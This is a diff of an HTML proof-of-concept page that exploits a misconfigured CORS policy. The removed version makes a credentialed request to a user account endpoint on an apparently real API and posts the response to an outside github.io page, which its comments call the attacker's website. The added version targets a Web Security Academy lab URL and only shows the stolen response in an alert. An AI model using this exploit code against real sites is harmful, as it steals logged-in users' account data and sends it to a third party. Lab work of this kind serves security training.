@@ -1,29 +1,24 @@
 <!DOCTYPE html>
 <html>
-<body>
-<center>
-<h2>CORS PoC</h2>
-<html>
-<body>
-<button type='button' onclick='cors()'>Exploit</button>
-<p id='demo'></p>
-<script>
-function cors() {
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-var a = this.responseText; // Sensitive data from niche.co about user account
-document.getElementById("demo").innerHTML = a;
-xhttp.open("POST", "https://verdecard2023.github.io/CORS/", true);// Sending that data to Attacker's website
-xhttp.withCredentials = true;
-console.log(a);
-xhttp.send("data="+a);
-}
-};
-xhttp.open("GET", "https://api-auth.ingresso.com/users/5bc8baac1054b81130f338cf", true);
-xhttp.withCredentials = true;
-xhttp.send();
-}
-</script>
-</body>
-</html>
+<title>Site fake</title>
+     <body>
+         <h2>Cross Origin Resource Sharing mal configurado</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Clique-aqui!</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://0ab600b403f80495804fe4a200a400af.web-security-academy.net/accountDetails", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
